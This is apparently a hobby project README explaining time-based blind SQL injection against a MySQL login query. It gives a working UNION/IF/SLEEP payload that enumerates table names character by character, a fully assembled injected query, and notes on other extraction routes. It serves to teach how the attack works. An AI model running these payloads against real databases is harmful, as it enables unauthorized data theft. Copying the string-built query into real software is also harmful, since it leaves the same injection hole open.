# Timing Based SQL Injections

SQL Injections are funny little guys to play with! Even though prepared statements have fixed a lot of SQL injections, SQL injections are still well and alive in the wild!  
So, there are different situations where SQL Injections occur and different ways to get the information. With a search engine like item, the information might be directed to you, an error might occur, or something else on that matter. But, what if NOTHING happens? Boom, here's the solution: 

## SetUp
I used a MySQL database to do this project, but this would work on any database. The Python script is just a basic login script.
## Timing 
 Most people only know about MySQL's most basic function usage, but it has much, much more capabilities than we realize! It has if statements, procedures, functions... And a ton of other items that can be easily exploited in the long run. The one I choose to use was the sleep function. The query calls a sleep condition if it's able to find a table with the correct starting characters. If this is the case, then the function sleeps. Because the function sleeps, it's easy to depict what tables are in the database! Below is the query being injected into:
 ``` 
 SELECT *
 FROM Login 
 WHERE user = "%s" AND 
 password = "%s"
 ```
 The input into the password field that acts as the injecting query:
 ```  
 " UNION select 1,if((SELECT table_name FROM information_schema.tables WHERE table_name like '" + letters+ char "%' LIMIT 1) IS NOT null, sleep(0.05), 'false') --
 ```
 
 The above is the input into the function. As seen above, the like command is used. Alongside the %, it will match anything starting with the characters given, and ending with anything else. The script in the file searches character by character until it finds a match. After this, it calls itself, with the newly adds character to the string that's already being used with.   
Also, notice the `--`. This is a comment in MySQL, which is able to cancels out everything after the comment. Very useful for escaping parts of queries!

  ## Full Query:
 ``` 
    SELECT *
    FROM Login
    WHERE user = "max"
    AND password = "A " UNION select 1,if((SELECT table_name FROM information_schema.tables WHERE table_name like 't%' LIMIT 1) IS NOT null, sleep(0.05), 'false') --" ;
 ```
 
 Above is a particular instance of the query, where it's checking if there's a table that starts with the letter t. If this is the case, then the query will sleep. 

## Future Work:
There are many other ways to get information out of a database without being able to see the physical information.  
Other routes: 
- Creating http requests to send information from the database.  
  - Only works on older systems. 
- Creating conditional runtimeerrors if a requirement is set.  
  - In the SELECT clause, using 1/0 can be useful. 
  - Returning a subquery that returning too many rows.


![](https://media.giphy.com/media/14kdiJUblbWBXy/giphy.gif)
